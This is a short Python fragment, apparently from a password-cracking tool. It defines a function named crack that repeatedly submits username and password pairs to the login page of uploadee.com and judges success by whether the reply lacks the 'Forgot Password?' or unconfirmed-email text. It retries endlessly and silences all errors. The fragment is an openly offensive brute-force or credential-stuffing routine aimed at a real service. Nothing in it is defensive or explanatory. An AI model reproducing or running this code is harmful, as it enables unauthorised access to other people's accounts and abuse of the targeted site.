...
def crack(user,passwd):
    while 1:
        try:
            ...
            br.open("http://uploadee.com/login","username="+user+"&password="+passwd+"&submit=Submit")

            if 'Forgot Password?' in br.response().read() or 'You have not confirmed your emai' in br.response().read():
                return False
            return True
        except:
            pass
